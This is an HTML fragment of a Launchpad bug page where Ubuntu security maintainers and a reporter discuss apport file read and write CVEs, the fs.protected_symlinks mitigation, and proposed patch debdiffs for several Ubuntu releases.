+<p>I&#x27;m not sure about the fs.protected_<wbr />symlinks aspect -- perhaps some apport users need to have this feature disabled for some reason, we shouldn&#x27;t leave them entirely out in the cold -- but the fact that a simple configuration option that we turn on by default mitigates this entire class of problems is compelling.</p>
+<p>Should we raise the fs.protected_<wbr />symlinks handling on oss-security for wider discussion? Perhaps it&#x27;s time we just treat that as an expected kernel feature.</p>
+<p>Thanks</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Nice report Mal, thanks.
+
+CVE-2021-32547 (openjdk-lts) -- add_info() arbitary file read
+CVE-2021-32548 (openjdk-8) -- add_info() arbitary file read
+CVE-2021-32549 (openjdk-13) -- add_info() arbitary file read
+CVE-2021-32550 (openjdk-14) -- add_info() arbitary file read
+CVE-2021-32551 (openjdk-15) -- add_info() arbitary file read
+CVE-2021-32552 (openjdk-16) -- add_info() arbitary file read
+CVE-2021-32553 (openjdk-17) -- add_info() arbitary file read
+CVE-2021-32554 (xorg) -- attach_3d_info() arbitrary file read
+CVE-2021-32555 (xorg-hwe-18.04) -- attach_3d_info() arbitrary file read
+CVE-2021-32556 (apport) -- get_modified_conffiles() incorrect changed files
+CVE-2021-32557 (apport) -- process_report() arbitrary file write
+
+I'm not sure about the fs.protected_symlinks aspect -- perhaps some apport users need to have this feature disabled for some reason, we shouldn't leave them entirely out in the cold -- but the fact that a simple configuration option that we turn on by default mitigates this entire class of problems is compelling.
+
+Should we raise the fs.protected_symlinks handling on oss-security for wider discussion? Perhaps it's time we just treat that as an expected kernel feature.
+
+Thanks</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/5" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mallle" class="sprite person">mal (mallle)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-11T08:07:20.199713+00:00" title="2021-05-11 08:07:20 UTC">on 2021-05-11</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/5"> #5</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hello,</p>
+<p>thank you for handling this and sorry for filing the bug against the upstream Apport project.</p>
+<p>As for the fs.protected_<wbr />symlinks handling, I&#x27;m very much interested in a wider discussion. I&#x27;m leaning towards treating that to be an expected mitigation but I&#x27;m more than interested in getting opinions from the community.</p>
+<p>Thanks,<br />
+maik</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Hello,
+
+thank you for handling this and sorry for filing the bug against the upstream Apport project.
+
+As for the fs.protected_symlinks handling, I'm very much interested in a wider discussion. I'm leaning towards treating that to be an expected mitigation but I'm more than interested in getting opinions from the community.
+
+Thanks,
+maik</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/6" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-11T10:34:54.131344+00:00" title="2021-05-11 10:34:54 UTC">on 2021-05-11</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/6"> #6</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>I will be working on patches for these issues today. Once we have an appropriate set of patches, I will check if Debian ships the affected scripts too, and will coordinate a proper CRD.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">I will be working on patches for these issues today. Once we have an appropriate set of patches, I will check if Debian ships the affected scripts too, and will coordinate a proper CRD.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/7" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-12T18:10:50.224704+00:00" title="2021-05-12 18:10:50 UTC">on 2021-05-12</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/7"> #7</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>What version of Ubuntu did you try your reproducers on? I&#x27;m having trouble getting them to work...</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">What version of Ubuntu did you try your reproducers on? I'm having trouble getting them to work...</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/8" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T11:48:11.940744+00:00" title="2021-05-13 11:48:11 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/8"> #8</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>I managed to reproduce the issues, whoopsie needs to be configured to automatically send the reports without manual intervention for the reproducers to work.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">I managed to reproduce the issues, whoopsie needs to be configured to automatically send the reports without manual intervention for the reproducers to work.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/13" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:09:23.044209+00:00" title="2021-05-13 16:09:23 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/13"> #13</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Brian, could you please take a look and review these debdiffs?</p>
+<p>Maik, could you do the same?</p>
+<p>Thanks!</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Brian, could you please take a look and review these debdiffs?
+
+Maik, could you do the same?
+
+Thanks!</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/14" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mallle" class="sprite person">mal (mallle)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:28:22.255085+00:00" title="2021-05-13 16:28:22 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/14"> #14</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Marc, sorry for the delay, we have a national holiday today.<br />
+I tested it against a default Ubuntu 20.04 installation.</p>
+<p>Regarding the patches, I&#x27;m not entirely sure if they are the correct ones, I only find references to pam_faillock. Sorry if I missed something, I just quickly glanced over them.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Marc, sorry for the delay, we have a national holiday today.
+I tested it against a default Ubuntu 20.04 installation.
+
+Regarding the patches, I'm not entirely sure if they are the correct ones, I only find references to pam_faillock. Sorry if I missed something, I just quickly glanced over them.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/15" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:42:18.957639+00:00" title="2021-05-13 16:42:18 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/15"> #15</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Oh, I attached the wrong debdiffs...whoops.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Oh, I attached the wrong debdiffs...whoops.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/16" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:43:41.174214+00:00" title="2021-05-13 16:43:41 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/16"> #16</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    <ul style="margin-bottom: 1em">
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497170/+files/apport_2.20.11-0ubuntu65.1.debdiff">proposed hirsute debdiff</a>
+        <a class="sprite edit action-icon" href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497170">Edit</a>
+        (5.5 KiB,
+        text/plain)
+      </li>
+    </ul>
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10"></textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/17" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:44:02.859267+00:00" title="2021-05-13 16:44:02 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/17"> #17</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    <ul style="margin-bottom: 1em">
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497171/+files/apport_2.20.11-0ubuntu50.7.debdiff">proposed groovy debdiff</a>
+        <a class="sprite edit action-icon" href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497171">Edit</a>
+        (5.5 KiB,
+        text/plain)
+      </li>
+    </ul>
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10"></textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/18" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:44:23.467778+00:00" title="2021-05-13 16:44:23 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/18"> #18</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    <ul style="margin-bottom: 1em">
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497172/+files/apport_2.20.11-0ubuntu27.18.debdiff">proposed focal debdiff</a>
+        <a class="sprite edit action-icon" href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497172">Edit</a>
+        (5.5 KiB,
+        text/plain)
+      </li>
+    </ul>
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10"></textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/19" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:44:42.103979+00:00" title="2021-05-13 16:44:42 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/19"> #19</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    <ul style="margin-bottom: 1em">
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497173/+files/apport_2.20.9-0ubuntu7.24.debdiff">proposed bionic debdiff</a>
+        <a class="sprite edit action-icon" href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497173">Edit</a>
+        (5.5 KiB,
+        text/plain)
+      </li>
+    </ul>
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10"></textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/20" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T16:44:59.614285+00:00" title="2021-05-13 16:44:59 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/20"> #20</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Here are the right debdiffs this time :)</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Here are the right debdiffs this time :)</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/21" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~brian-murray" class="sprite person">Brian Murray (brian-murray)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T22:20:04.635348+00:00" title="2021-05-13 22:20:04 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
